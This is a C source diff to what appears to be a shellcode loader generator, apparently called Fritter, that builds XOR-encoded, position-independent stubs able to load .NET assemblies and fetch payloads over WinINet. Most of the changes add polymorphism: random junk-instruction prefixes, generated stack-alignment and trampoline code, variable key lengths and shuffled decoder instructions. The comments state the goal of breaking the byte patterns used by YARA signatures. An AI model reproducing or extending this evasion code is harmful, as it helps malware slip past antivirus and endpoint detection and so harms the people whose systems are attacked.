@@ -44,80 +44,17 @@
 #define DLL_NAMES "ole32;oleaut32;wininet;mscoree;shell32"
  
 // These must be in the same order as the FRITTER_INSTANCE structure defined in fritter.h
-static API_IMPORT api_imports[] = { 
-  {KERNEL32_DLL, "LoadLibraryA"},
-  {KERNEL32_DLL, "GetProcAddress"},
-  {KERNEL32_DLL, "GetModuleHandleA"},
-  {KERNEL32_DLL, "VirtualAlloc"},
-  {KERNEL32_DLL, "VirtualFree"},
-  {KERNEL32_DLL, "VirtualQuery"},
-  {KERNEL32_DLL, "VirtualProtect"},
-  {KERNEL32_DLL, "Sleep"},
-  {KERNEL32_DLL, "MultiByteToWideChar"},
-  {KERNEL32_DLL, "GetUserDefaultLCID"},
-  {KERNEL32_DLL, "WaitForSingleObject"},
-  {KERNEL32_DLL, "CreateThread"},
-  {KERNEL32_DLL, "CreateFileA"},
-  {KERNEL32_DLL, "GetFileSizeEx"},
-  {KERNEL32_DLL, "GetThreadContext"},
-  {KERNEL32_DLL, "GetCurrentThread"},
-  {KERNEL32_DLL, "GetCurrentProcess"},
-  {KERNEL32_DLL, "GetCommandLineA"},
-  {KERNEL32_DLL, "GetCommandLineW"},
-  {KERNEL32_DLL, "HeapAlloc"},
-  {KERNEL32_DLL, "HeapReAlloc"},
-  {KERNEL32_DLL, "GetProcessHeap"},
-  {KERNEL32_DLL, "HeapFree"},
-  {KERNEL32_DLL, "GetLastError"},
-  {KERNEL32_DLL, "CloseHandle"},
-        
-  {SHELL32_DLL,  "CommandLineToArgvW"},
-  
-  {OLEAUT32_DLL, "SafeArrayCreate"},
-  {OLEAUT32_DLL, "SafeArrayCreateVector"},
-  {OLEAUT32_DLL, "SafeArrayPutElement"},
-  {OLEAUT32_DLL, "SafeArrayDestroy"},
-  {OLEAUT32_DLL, "SafeArrayGetLBound"},
-  {OLEAUT32_DLL, "SafeArrayGetUBound"},
-  {OLEAUT32_DLL, "SysAllocString"},
-  {OLEAUT32_DLL, "SysFreeString"},
-  {OLEAUT32_DLL, "LoadTypeLib"},
-  
-  {WININET_DLL,  "InternetCrackUrlA"},
-  {WININET_DLL,  "InternetOpenA"},
-  {WININET_DLL,  "InternetConnectA"},
-  {WININET_DLL,  "InternetSetOptionA"},
-  {WININET_DLL,  "InternetReadFile"},
-  {WININET_DLL,  "InternetQueryDataAvailable"},
-  {WININET_DLL,  "InternetCloseHandle"},
-  {WININET_DLL,  "HttpOpenRequestA"},
-  {WININET_DLL,  "HttpSendRequestA"},
-  {WININET_DLL,  "HttpQueryInfoA"},
-  
-  {MSCOREE_DLL,  "CorBindToRuntime"},
-  {MSCOREE_DLL,  "CLRCreateInstance"},
-  
-  {OLE32_DLL,    "CoInitializeEx"},
-  {OLE32_DLL,    "CoCreateInstance"},
-  {OLE32_DLL,    "CoUninitialize"},
-
-  {NTDLL_DLL,    "RtlEqualUnicodeString"},
-  {NTDLL_DLL,    "RtlEqualString"},
-  {NTDLL_DLL,    "RtlUnicodeStringToAnsiString"},
-  {NTDLL_DLL,    "RtlInitUnicodeString"},
-  {NTDLL_DLL,    "RtlExitUserThread"},
-  {NTDLL_DLL,    "RtlExitUserProcess"},
-  {NTDLL_DLL,    "RtlCreateUnicodeString"},
-  {NTDLL_DLL,    "NtContinue"},
-  {NTDLL_DLL,    "NtCreateSection"},
-  {NTDLL_DLL,    "NtMapViewOfSection"},
-  {NTDLL_DLL,    "NtUnmapViewOfSection"},
-  //{KERNEL32_DLL, "AddVectoredExceptionHandler"},
-  //{KERNEL32_DLL, "RemoveVectoredExceptionHandler"},
-  //{NTDLL_DLL,    "RtlFreeUnicodeString"},
-  //{NTDLL_DLL,    "RtlFreeString"},
-  
-  { NULL, NULL }   // last one always contains two NULL pointers
+// Order is generated per build by tools/gen_api_shuffle into
+// include/api_shuffle.h from the canonical list in include/api_master.h.
+// Slot 0 is pinned as LoadLibraryA (loader.c resolves it explicitly
+// before the DLL-loading loop). Both this table and the typed-struct
+// view in fritter.h expand from the same shuffled list, so they
+// cannot disagree.
+static API_IMPORT api_imports[] = {
+  #define XAPI(dll, name, type, field) {dll, name},
+  #include "api_shuffle.h"
+  #undef XAPI
+  { NULL, NULL }   // sentinel
 };
 
 // required to load .NET assemblies
@@ -556,13 +493,15 @@ static int gen_random(void *buf, uint64_t len) {
     int      fd;
     uint64_t r=0;
     uint8_t  *p=(uint8_t*)buf;
-    
+
     DPRINT("Opening /dev/urandom to acquire %li bytes", len);
     fd = open("/dev/urandom", O_RDONLY);
-    
-    if(fd > 0) {
-      for(r=0; r<len; r++, p++) {
-        if(read(fd, p, 1) != 1) break;
+
+    if(fd >= 0) {
+      while(r < len) {
+        ssize_t n = read(fd, p + r, (size_t)(len - r));
+        if(n <= 0) break;
+        r += (uint64_t)n;
       }
       close(fd);
     }
@@ -840,6 +779,12 @@ static int build_instance(PFRITTER_CONFIG c) {
     DPRINT("Generating hashes for API using IV: %" PRIX64, inst->iv);
     
     for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
+      if(cnt >= (int)(sizeof(inst->api.hash)/sizeof(inst->api.hash[0]))) {
+        DPRINT("api_imports exceeds FRITTER_INSTANCE.api ceiling (%zu)",
+               sizeof(inst->api.hash)/sizeof(inst->api.hash[0]));
+        err = FRITTER_ERROR_INVALID_PARAMETER;
+        goto cleanup;
+      }
       // calculate hash for DLL string
       dll_hash = maru(api_imports[cnt].module, inst->iv);
       
@@ -1142,40 +1087,22 @@ static int save_loader(PFRITTER_CONFIG c) {
  *   OUTPUT : Fritter error code.
  */
 static int build_loader(PFRITTER_CONFIG c) {
-    // RSP alignment variants — all have 5-byte epilogue so call rel32=5 works
-    // Variant 0: push rbp / mov rbp,rsp / and rsp,-0x10 / sub rsp,0x20 / call $+5 / mov rsp,rbp / pop rbp / ret
-    static unsigned char RSP_ALIGN_V0[] = {
-        0x55,
-        0x48, 0x89, 0xE5,
-        0x48, 0x83, 0xE4, 0xF0,
-        0x48, 0x83, 0xEC, 0x20,
-        0xE8, 0x05, 0x00, 0x00, 0x00,
-        0x48, 0x89, 0xEC,
-        0x5D,
-        0xC3
+    // RSP alignment is generated per output below: random save register
+    // (RBX/RBP/R13/R14/R15), random save form (mov vs lea), random restore
+    // form, and random junk between each instruction. Replaces three fixed
+    // template variants whose bytes were enumerable signatures.
+
+    // Safe junk pool - flag-only / reg-form NOPs. No memory, no stack,
+    // no clobber of RCX. Used by the RSP-align generator and the decoder.
+    static const struct { uint8_t b[4]; uint8_t n; } djunk[] = {
+      {{0x90},                   1}, // nop
+      {{0x66, 0x90},             2}, // 66 nop
+      {{0x0F, 0x1F, 0xC0},      3}, // nop eax (reg-form)
+      {{0xF8},                   1}, // clc
+      {{0xF9},                   1}, // stc
+      {{0xF5},                   1}, // cmc
     };
-    // Variant 1: push rbx / mov rbx,rsp / and rsp,-0x10 / sub rsp,0x20 / call $+5 / mov rsp,rbx / pop rbx / ret
-    static unsigned char RSP_ALIGN_V1[] = {
-        0x53,
-        0x48, 0x89, 0xE3,
-        0x48, 0x83, 0xE4, 0xF0,
-        0x48, 0x83, 0xEC, 0x20,
-        0xE8, 0x05, 0x00, 0x00, 0x00,
-        0x48, 0x89, 0xDC,
-        0x5B,
-        0xC3
-    };
-    // Variant 2: push rbp / lea rbp,[rsp] / and rsp,-0x10 / sub rsp,0x20 / call $+6 / lea rsp,[rbp] / pop rbp / ret
-    static unsigned char RSP_ALIGN_V2[] = {
-        0x55,
-        0x48, 0x8D, 0x2C, 0x24,
-        0x48, 0x83, 0xE4, 0xF0,
-        0x48, 0x83, 0xEC, 0x20,
-        0xE8, 0x06, 0x00, 0x00, 0x00,
-        0x48, 0x8D, 0x65, 0x00,
-        0x5D,
-        0xC3
-    };
+    #define DJUNK_COUNT 6
 
     // Junk instructions that preserve RCX (for insertion between POP and RSP_ALIGN)
     static unsigned char JUNK_NOP1[] = { 0x90 };                           // nop
@@ -1217,31 +1144,229 @@ static int build_loader(PFRITTER_CONFIG c) {
         break;
     }
 
-    // --- Feature 2A: Random junk prefix (0-15 bytes) ---
-    gen_random(&rnd_byte, 1);
-    uint8_t junk_prefix_len = rnd_byte & 0x0F; // 0-15
-    DPRINT("Junk prefix length: %d", junk_prefix_len);
+    // --- Feature 2A: Junk fall-through prefix (0-47 bytes, no jump) ---
+    //
+    // Per output, fill 0-47 bytes from a pool of safe no-op instructions.
+    // The bytes execute as no-ops and fall through to the CALL - there is
+    // no "jump-over-junk" anchor (no leading EB/E9/etc.) for YARA rules
+    // to position from. Length AND internal layout vary per output: at any
+    // given total length, the choice of which instruction occupies which
+    // byte position differs, since pool entries are 1..9 bytes wide.
+    //
+    // Pool members are documented no-op forms. The CPU's NOP family
+    // (0F 1F /0 etc.) accepts a ModR/M byte that looks like memory
+    // addressing but is recognized as a NOP and performs no memory
+    // access - safe even when RAX is uninitialized at entry.
+    static const struct { uint8_t b[9]; uint8_t n; } pfx_pool[] = {
+        {{0x90},                                                  1}, // nop
+        {{0xF8},                                                  1}, // clc
+        {{0xF9},                                                  1}, // stc
+        {{0xF5},                                                  1}, // cmc
+        {{0x66, 0x90},                                            2}, // 66 nop
+        {{0x0F, 0x1F, 0x00},                                      3}, // nop dword [rax]
+        {{0x0F, 0x1F, 0xC0},                                      3}, // nop eax (reg form)
+        {{0x48, 0x87, 0xC0},                                      3}, // xchg rax, rax
+        {{0x0F, 0x1F, 0x40, 0x00},                                4}, // nop dword [rax+0]
+        {{0x0F, 0x1F, 0x44, 0x00, 0x00},                          5}, // nop dword [rax+rax+0]
+        {{0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00},                    6}, // nop word [rax+rax+0]
+        {{0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00},              7}, // nop dword [rax+0]
+        {{0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00},        8}, // nop dword [rax+rax+0]
+        {{0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00},  9}, // nop word [rax+rax+0]
+    };
+    #define PFX_POOL_COUNT (sizeof(pfx_pool)/sizeof(pfx_pool[0]))
 
-    // --- Feature 2B: Select random RSP_ALIGN variant ---
-    unsigned char *rsp_align;
-    uint32_t       rsp_align_size;
-
+    static uint8_t pfx_buf[64];
+    uint32_t pfx_len = 0;
     gen_random(&rnd_byte, 1);
-    switch(rnd_byte % 3) {
-      case 0:
-        rsp_align = RSP_ALIGN_V0;
-        rsp_align_size = sizeof(RSP_ALIGN_V0);
-        break;
-      case 1:
-        rsp_align = RSP_ALIGN_V1;
-        rsp_align_size = sizeof(RSP_ALIGN_V1);
-        break;
-      default:
-        rsp_align = RSP_ALIGN_V2;
-        rsp_align_size = sizeof(RSP_ALIGN_V2);
-        break;
+    uint32_t pfx_target = rnd_byte & 0x3F;   // 0..63
+    while(pfx_len < pfx_target) {
+      gen_random(&rnd_byte, 1);
+      uint32_t idx = rnd_byte % PFX_POOL_COUNT;
+      uint32_t need = pfx_pool[idx].n;
+      if(pfx_len + need > pfx_target) {
+        // would overshoot - fall back to a 1-byte entry (indices 0-3)
+        // (don't name a local "small" - Windows rpcndr.h typedefs it to char)
+        gen_random(&rnd_byte, 1);
+        uint32_t small_idx = rnd_byte & 0x03;
+        pfx_buf[pfx_len++] = pfx_pool[small_idx].b[0];
+        continue;
+      }
+      memcpy(pfx_buf + pfx_len, pfx_pool[idx].b, need);
+      pfx_len += need;
     }
-    DPRINT("RSP align variant size: %d", rsp_align_size);
+    DPRINT("Prefix fall-through length: %u (target %u)", pfx_len, pfx_target);
+
+    // --- Feature 2B: Generative RSP alignment routine ---
+    // Layout emitted: [push reg] [save reg<-rsp] [and rsp,-16] [sub rsp,32]
+    //                 [CALL rel32 disp=epi_size]
+    //                 [restore rsp<-reg] [pop reg] [ret]
+    // Junk inserted at 4 sites in prologue and 2 sites in epilogue.
+    // Save register from {RBX,RBP,R13,R14,R15}; save and restore forms
+    // (mov vs lea) chosen independently. CALL disp computed dynamically.
+
+    static const uint8_t RSP_SAVE_REGS[] = { 3, 5, 13, 14, 15 }; // RBX,RBP,R13,R14,R15
+    static uint8_t rsp_buf[128];
+    uint32_t rsp_n = 0;
+
+    gen_random(&rnd_byte, 1);
+    uint8_t  rsp_save_reg = RSP_SAVE_REGS[rnd_byte % (sizeof(RSP_SAVE_REGS)/sizeof(RSP_SAVE_REGS[0]))];
+    uint8_t  rsp_rex_b    = (rsp_save_reg >= 8) ? 1 : 0;
+    uint8_t  rsp_reg3     = rsp_save_reg & 7;
+    gen_random(&rnd_byte, 1);
+    int rsp_save_form     = rnd_byte & 1;  // 0 = mov, 1 = lea
+    gen_random(&rnd_byte, 1);
+    int rsp_restore_form  = rnd_byte & 1;
+
+    // Local junk emitter - params have leading underscore to avoid collision
+    // with djunk[].n field referenced in the macro body.
+    #define RSP_JUNK(_dst, _pos) do { \
+      gen_random(&rnd_byte, 1); \
+      int _jc = rnd_byte & 0x03; \
+      for(int _j = 0; _j < _jc; _j++) { \
+        gen_random(&rnd_byte, 1); \
+        int _ji = rnd_byte % DJUNK_COUNT; \
+        memcpy((_dst) + (_pos), djunk[_ji].b, djunk[_ji].n); \
+        (_pos) += djunk[_ji].n; \
+      } \
+    } while(0)
+
+    // Build epilogue first into a temp buffer so we know its size for CALL disp
+    uint8_t epi_buf[64];
+    uint32_t epi_n = 0;
+
+    // restore: mov rsp,reg  OR  lea rsp,[reg+0]
+    if (rsp_restore_form == 0) {
+      epi_buf[epi_n++] = 0x48 | (rsp_rex_b ? 0x04 : 0); // REX.R for src
+      epi_buf[epi_n++] = 0x89;
+      epi_buf[epi_n++] = 0xC0 | (rsp_reg3 << 3) | 4;    // mod=11, reg=src, rm=4(rsp)
+    } else {
+      epi_buf[epi_n++] = 0x48 | (rsp_rex_b ? 0x01 : 0); // REX.B for r/m
+      epi_buf[epi_n++] = 0x8D;
+      epi_buf[epi_n++] = 0x40 | (4 << 3) | rsp_reg3;    // mod=01 disp8, reg=4(rsp dst), rm=src
+      epi_buf[epi_n++] = 0x00;                          // disp8 = 0
+    }
+    RSP_JUNK(epi_buf, epi_n);
+
+    // pop reg
+    if (rsp_rex_b) epi_buf[epi_n++] = 0x41;
+    epi_buf[epi_n++] = 0x58 | rsp_reg3;
+    RSP_JUNK(epi_buf, epi_n);
+
+    // ret
+    epi_buf[epi_n++] = 0xC3;
+
+    // Now emit prologue into rsp_buf
+    // push reg
+    if (rsp_rex_b) rsp_buf[rsp_n++] = 0x41;
+    rsp_buf[rsp_n++] = 0x50 | rsp_reg3;
+    RSP_JUNK(rsp_buf, rsp_n);
+
+    // save: mov reg,rsp  OR  lea reg,[rsp]
+    if (rsp_save_form == 0) {
+      rsp_buf[rsp_n++] = 0x48 | (rsp_rex_b ? 0x01 : 0); // REX.B for r/m=dst
+      rsp_buf[rsp_n++] = 0x89;
+      rsp_buf[rsp_n++] = 0xC0 | (4 << 3) | rsp_reg3;    // mod=11, reg=4(rsp src), rm=dst
+    } else {
+      rsp_buf[rsp_n++] = 0x48 | (rsp_rex_b ? 0x04 : 0); // REX.R for reg=dst
+      rsp_buf[rsp_n++] = 0x8D;
+      rsp_buf[rsp_n++] = (rsp_reg3 << 3) | 4;            // mod=00, reg=dst, rm=100 (SIB)
+      rsp_buf[rsp_n++] = 0x24;                           // SIB: scale=0, idx=4(none), base=4(rsp)
+    }
+    RSP_JUNK(rsp_buf, rsp_n);
+
+    // and rsp,-0x10
+    rsp_buf[rsp_n++] = 0x48; rsp_buf[rsp_n++] = 0x83;
+    rsp_buf[rsp_n++] = 0xE4; rsp_buf[rsp_n++] = 0xF0;
+    RSP_JUNK(rsp_buf, rsp_n);
+
+    // sub rsp,0x20
+    rsp_buf[rsp_n++] = 0x48; rsp_buf[rsp_n++] = 0x83;
+    rsp_buf[rsp_n++] = 0xEC; rsp_buf[rsp_n++] = 0x20;
+    RSP_JUNK(rsp_buf, rsp_n);
+
+    // CALL rel32, disp = epilogue size (skips over epilogue to fall into decoder)
+    rsp_buf[rsp_n++] = 0xE8;
+    {
+      int32_t call_disp = (int32_t)epi_n;
+      memcpy(rsp_buf + rsp_n, &call_disp, 4);
+      rsp_n += 4;
+    }
+
+    // Append epilogue
+    memcpy(rsp_buf + rsp_n, epi_buf, epi_n);
+    rsp_n += epi_n;
+
+    unsigned char *rsp_align      = rsp_buf;
+    uint32_t       rsp_align_size = rsp_n;
+
+    DPRINT("Generated RSP align: save_reg=%u save=%s restore=%s size=%u (epi=%u)",
+           rsp_save_reg, rsp_save_form ? "lea" : "mov",
+           rsp_restore_form ? "lea" : "mov", rsp_n, epi_n);
+
+    // --- Feature 2D: Generative decoder→shim trampoline ---
+    // Layout emitted: [LEA <reg>, [rip+disp32]]
+    //                 [optional MOV RDX, <reg> if reg != RDX]
+    //                 [junk 0..3 picks from djunk pool]
+    //                 [JMP rel32 with disp=page_pad  OR  JMP RDX (FF E2)]
+    // Replaces the static `48 8D 15 ?? ?? ?? ?? E9 ?? ?? ?? ??` pattern.
+    // LEA disp and (if used) JMP disp are patched after page_pad is known.
+
+    static const uint8_t TRAMP_LEA_REGS[] = { 3, 2, 6, 7, 8 }; // RBX,RDX,RSI,RDI,R8
+    static uint8_t tramp_buf[64];
+    uint32_t tramp_n = 0;
+    uint32_t tramp_lea_disp_off = 0;
+    uint32_t tramp_jmp_disp_off = 0;
+    int      tramp_jmp_indirect = 0;
+
+    gen_random(&rnd_byte, 1);
+    uint8_t  tramp_reg    = TRAMP_LEA_REGS[rnd_byte % (sizeof(TRAMP_LEA_REGS)/sizeof(TRAMP_LEA_REGS[0]))];
+    uint8_t  tramp_rex_r  = (tramp_reg >= 8) ? 1 : 0;
+    uint8_t  tramp_reg3   = tramp_reg & 7;
+
+    gen_random(&rnd_byte, 1);
+    tramp_jmp_indirect = rnd_byte & 1;  // 0 = JMP rel32, 1 = JMP RDX
+
+    // LEA <reg>, [rip+disp32] - REX.W (+ REX.R for r8-r15), 8D, ModRM(mod=00,reg=tgt,rm=5)
+    tramp_buf[tramp_n++] = 0x48 | (tramp_rex_r ? 0x04 : 0);
+    tramp_buf[tramp_n++] = 0x8D;
+    tramp_buf[tramp_n++] = 0x05 | (tramp_reg3 << 3);
+    tramp_lea_disp_off   = tramp_n;
+    tramp_n += 4;  // disp32 placeholder
+
+    // MOV RDX, <reg>  (only if target isn't already RDX)
+    if (tramp_reg != 2) {
+      tramp_buf[tramp_n++] = 0x48 | (tramp_rex_r ? 0x04 : 0);  // REX.W (+ REX.R for src)
+      tramp_buf[tramp_n++] = 0x89;
+      tramp_buf[tramp_n++] = 0xC0 | (tramp_reg3 << 3) | 2;     // mod=11, reg=src, rm=2(RDX)
+    }
+
+    // 0..3 djunk picks between MOV/LEA and JMP
+    {
+      gen_random(&rnd_byte, 1);
+      int jcount = rnd_byte & 0x03;
+      for (int j = 0; j < jcount; j++) {
+        gen_random(&rnd_byte, 1);
+        int jidx = rnd_byte % DJUNK_COUNT;
+        memcpy(tramp_buf + tramp_n, djunk[jidx].b, djunk[jidx].n);
+        tramp_n += djunk[jidx].n;
+      }
+    }
+
+    // JMP form
+    if (tramp_jmp_indirect) {
+      // FF E2 - JMP RDX (2 bytes, no displacement)
+      tramp_buf[tramp_n++] = 0xFF;
+      tramp_buf[tramp_n++] = 0xE2;
+    } else {
+      // E9 disp32 - JMP rel32 (5 bytes, disp = page_pad, patched later)
+      tramp_buf[tramp_n++] = 0xE9;
+      tramp_jmp_disp_off   = tramp_n;
+      tramp_n += 4;  // disp32 placeholder
+    }
+
+    uint32_t tramp_size = tramp_n;
+    DPRINT("Trampoline: lea_reg=%u jmp=%s size=%u",
+           tramp_reg, tramp_jmp_indirect ? "JMP RDX" : "JMP rel32", tramp_size);
 
     // --- Feature 2C: Random junk between POP and RSP_ALIGN (0-8 bytes) ---
     uint8_t junk_mid[8];
@@ -1272,8 +1397,33 @@ static int build_loader(PFRITTER_CONFIG c) {
     //         [dec counter] [jnz loop] [junk]* [pop rcx] [8 key bytes]
     //         (fall through to decoded loader)
 
-    uint8_t xor_key[8];
-    gen_random(xor_key, 8);
+    // --- Variable key length (4, 8, or 16 bytes) ---
+    // Drives AND-mask immediate, JMP-SHORT imm over key tail, trailing
+    // key byte count, AND host-side XOR encode mask. One pick collapses
+    // three previously-fixed anchors (`AND ?? 07`, `EB 08`, 8-byte tail).
+    uint8_t xor_key[16];
+    uint32_t key_len;
+    uint8_t  key_mask;
+    gen_random(&rnd_byte, 1);
+    switch(rnd_byte % 3) {
+      case 0:  key_len = 4;  key_mask = 0x03; break;
+      case 1:  key_len = 8;  key_mask = 0x07; break;
+      default: key_len = 16; key_mask = 0x0F; break;
+    }
+    gen_random(xor_key, key_len);
+
+    // --- Zero-init opcode: XOR (0x31) or SUB (0x29) ---
+    // Same ModRM shape, same effect on the register; opcode flip alone.
+    gen_random(&rnd_byte, 1);
+    uint8_t zero_opcode = (rnd_byte & 1) ? 0x29 : 0x31;
+
+    // --- Hot-loop ordering of {inc_dp, inc_idx, and_mask} ---
+    // 3 valid orderings (and_mask must follow inc_idx):
+    //   0: inc_dp, inc_idx, and_mask
+    //   1: inc_idx, inc_dp, and_mask
+    //   2: inc_idx, and_mask, inc_dp
+    gen_random(&rnd_byte, 1);
+    int loop_order = rnd_byte % 3;
 
     // --- Register selection ---
     // Roles: key_ptr, data_ptr, counter, key_idx
@@ -1299,16 +1449,7 @@ static int build_loader(PFRITTER_CONFIG c) {
     DREG rCNT = dreg_pool[didx[2]]; // loop counter
     DREG rIDX = dreg_pool[didx[3]]; // key index (0-7)
 
-    // --- Safe junk instructions (no register/memory dependencies) ---
-    static const struct { uint8_t b[4]; uint8_t n; } djunk[] = {
-      {{0x90},                   1}, // nop
-      {{0x66, 0x90},             2}, // 66 nop
-      {{0x0F, 0x1F, 0xC0},      3}, // nop eax (reg-form, no mem access)
-      {{0xF8},                   1}, // clc
-      {{0xF9},                   1}, // stc
-      {{0xF5},                   1}, // cmc
-    };
-    #define DJUNK_COUNT 6
+    // djunk[] / DJUNK_COUNT defined at top of function - shared with RSP-align gen
 
     // Helper: emit 0-3 random junk instructions into buf at offset ds
     #define EMIT_JUNK() do { \
@@ -1335,6 +1476,10 @@ static int build_loader(PFRITTER_CONFIG c) {
     int ds = 0;
 
     // --- Pass 1: emit instructions with junk ---
+
+    // Leading djunk - shifts `push rcx` (0x51) off byte 0 of the stub
+    // so the call-site landing byte is no longer a stable anchor.
+    EMIT_JUNK();
 
     // push rcx (preserve instance pointer)
     db[ds++] = 0x51;
@@ -1368,9 +1513,9 @@ static int build_loader(PFRITTER_CONFIG c) {
     ds += 4;
     EMIT_JUNK();
 
-    // xor key_idx_32, key_idx_32 (zero the index)
+    // zero key_idx_32 - XOR (0x31) or SUB (0x29), randomized per output
     if(rIDX.rex) db[ds++] = 0x45; // REX.RB (same reg in both fields)
-    db[ds++] = 0x31;
+    db[ds++] = zero_opcode;
     db[ds++] = 0xC0 | (rIDX.reg3 << 3) | rIDX.reg3;
     EMIT_JUNK();
 
@@ -1398,42 +1543,60 @@ static int build_loader(PFRITTER_CONFIG c) {
     }
     EMIT_JUNK();
 
-    // inc data_ptr (64-bit)
-    db[ds++] = 0x48 | rDP.rex; // REX.W + REX.B
-    db[ds++] = 0xFF;
-    db[ds++] = 0xC0 | rDP.reg3; // ModRM: mod=11, reg=000(/0=INC), rm=data_ptr
-    EMIT_JUNK();
+    // --- Reorderable middle: {inc_dp, inc_idx, and_mask} ---
+    // Local emitters; called in `loop_order`-selected sequence.
+    #define EMIT_INC_DP() do { \
+      db[ds++] = 0x48 | rDP.rex; \
+      db[ds++] = 0xFF; \
+      db[ds++] = 0xC0 | rDP.reg3; \
+    } while(0)
 
-    // inc key_idx low byte
-    {
-      uint8_t rex = 0;
-      if(rIDX.rex) rex = 0x41;
-      else if(rIDX.reg3 >= 4) rex = 0x40; // need REX for SIL/DIL byte access
-      if(rex) db[ds++] = rex;
-      db[ds++] = 0xFE;
-      db[ds++] = 0xC0 | rIDX.reg3; // INC r8
+    #define EMIT_INC_IDX() do { \
+      uint8_t _rex = 0; \
+      if(rIDX.rex) _rex = 0x41; \
+      else if(rIDX.reg3 >= 4) _rex = 0x40; \
+      if(_rex) db[ds++] = _rex; \
+      db[ds++] = 0xFE; \
+      db[ds++] = 0xC0 | rIDX.reg3; \
+    } while(0)
+
+    #define EMIT_AND_MASK() do { \
+      uint8_t _rex = 0; \
+      if(rIDX.rex) _rex = 0x41; \
+      else if(rIDX.reg3 >= 4) _rex = 0x40; \
+      if(_rex) db[ds++] = _rex; \
+      db[ds++] = 0x80; \
+      db[ds++] = 0xE0 | rIDX.reg3; \
+      db[ds++] = key_mask; \
+    } while(0)
+
+    switch(loop_order) {
+      case 0: // inc_dp, inc_idx, and_mask
+        EMIT_INC_DP();   EMIT_JUNK();
+        EMIT_INC_IDX();  EMIT_JUNK();
+        EMIT_AND_MASK();
+        break;
+      case 1: // inc_idx, inc_dp, and_mask
+        EMIT_INC_IDX();  EMIT_JUNK();
+        EMIT_INC_DP();   EMIT_JUNK();
+        EMIT_AND_MASK();
+        break;
+      default: // inc_idx, and_mask, inc_dp
+        EMIT_INC_IDX();  EMIT_JUNK();
+        EMIT_AND_MASK(); EMIT_JUNK();
+        EMIT_INC_DP();
+        break;
     }
+    // Trailing junk before DEC (DEC+JNZ must be flag-adjacent - no junk
+    // between them, but here is fine since DEC overwrites flags from any
+    // intervening instruction).
     EMIT_JUNK();
 
-    // and key_idx low byte, 7
-    {
-      uint8_t rex = 0;
-      if(rIDX.rex) rex = 0x41;
-      else if(rIDX.reg3 >= 4) rex = 0x40;
-      if(rex) db[ds++] = rex;
-      db[ds++] = 0x80;
-      db[ds++] = 0xE0 | rIDX.reg3; // AND r/m8, imm8
-      db[ds++] = 0x07;
-    }
-    // NO junk between AND and DEC — but DEC+JNZ must be atomic (flags)
-    // Actually AND sets flags too, but DEC is the one JNZ reads. Insert junk here is OK.
-    EMIT_JUNK();
-
-    // dec counter_32 + jnz loop (atomic pair — JNZ reads flags from DEC)
+    // dec counter_32 + jnz loop (atomic pair - JNZ reads flags from DEC)
     if(rCNT.rex) db[ds++] = 0x41;
     db[ds++] = 0xFF;
     db[ds++] = 0xC8 | rCNT.reg3; // DEC r32
-    // jnz (placeholder — patched in pass 2)
+    // jnz (placeholder - patched in pass 2)
     db[ds++] = 0x75;
     fixup_offset[FIXUP_JNZ] = ds;
 
@@ -1443,14 +1606,19 @@ static int build_loader(PFRITTER_CONFIG c) {
 
     // pop rcx (restore instance pointer)
     db[ds++] = 0x59;
-    // jmp short +8 (skip over key data to reach decoded loader)
-    db[ds++] = 0xEB;
-    db[ds++] = 0x08;
+    // Junk between POP and JMP-SHORT - breaks the `59 EB ??` 3-byte anchor
+    // by inserting 0..N pool bytes in the middle. JMP imm still skips
+    // exactly key_len bytes (junk lives BEFORE the EB).
+    EMIT_JUNK();
 
-    // Append 8-byte XOR key at end of decoder (not executed)
+    // jmp short +key_len (skip over key data to reach decoded loader)
+    db[ds++] = 0xEB;
+    db[ds++] = (uint8_t)key_len;
+
+    // Append key bytes at end of decoder (not executed)
     int key_offset = ds;
-    memcpy(db + ds, xor_key, 8);
-    ds += 8;
+    memcpy(db + ds, xor_key, key_len);
+    ds += key_len;
 
     uint32_t decoder_stub_size = ds;
 
@@ -1458,13 +1626,28 @@ static int build_loader(PFRITTER_CONFIG c) {
     // The combined blob (shim+loader) must start at a page-aligned address.
     // VirtualAlloc gives 64KB-aligned memory, so we just need the offset from
     // PIC start to be a multiple of 4096.
-    // Between decoder and encoded data: [lea rdx 7B] [jmp rel32 5B] [page_pad]
-    uint32_t prefix_overhead = (junk_prefix_len > 0) ? (2 + junk_prefix_len) : 0;
-    uint32_t pre_blob_size = prefix_overhead + 5 + c->inst_len + 1 + junk_mid_len +
-                             rsp_align_size + decoder_stub_size + 7 + 5;
+    // Between decoder and encoded data: [trampoline (variable size)] [page_pad]
+    // Prefix is pure junk fall-through - no header bytes, just pfx_len of payload.
+    uint32_t pre_blob_size = pfx_len + 5 + c->inst_len + 1 + junk_mid_len +
+                             rsp_align_size + decoder_stub_size + tramp_size;
     uint32_t page_pad = (4096 - (pre_blob_size & 0xFFF)) & 0xFFF;
     DPRINT("Page alignment: pre_blob=%d, page_pad=%d, total_offset=%d",
            pre_blob_size, page_pad, pre_blob_size + page_pad);
+
+    // Patch trampoline displacements now that page_pad is known.
+    // Shim entry sits at: trampoline_start + tramp_size + page_pad
+    //   LEA RIP-rel target = (trampoline_start + 7) + lea_disp = shim_entry
+    //   → lea_disp = (tramp_size - 7) + page_pad
+    //   JMP rel32 target  = (trampoline_start + tramp_size) + jmp_disp = shim_entry
+    //   → jmp_disp = page_pad
+    {
+      int32_t lea_disp = (int32_t)(tramp_size - 7) + (int32_t)page_pad;
+      memcpy(tramp_buf + tramp_lea_disp_off, &lea_disp, 4);
+      if (!tramp_jmp_indirect) {
+        int32_t jmp_disp = (int32_t)page_pad;
+        memcpy(tramp_buf + tramp_jmp_disp_off, &jmp_disp, 4);
+      }
+    }
 
     // --- Pass 2: patch displacements ---
     {
@@ -1472,8 +1655,8 @@ static int build_loader(PFRITTER_CONFIG c) {
       int32_t d = key_offset - fixup_end[FIXUP_KEY];
       memcpy(db + fixup_offset[FIXUP_KEY], &d, 4);
 
-      // LEA data_ptr: target past lea(7) + jmp(5) + page_pad = start of encoded data
-      d = (int32_t)(decoder_stub_size + 7 + 5 + page_pad) - fixup_end[FIXUP_DATA];
+      // LEA data_ptr: target past trampoline + page_pad = start of encoded data
+      d = (int32_t)(decoder_stub_size + tramp_size + page_pad) - fixup_end[FIXUP_DATA];
       memcpy(db + fixup_offset[FIXUP_DATA], &d, 4);
 
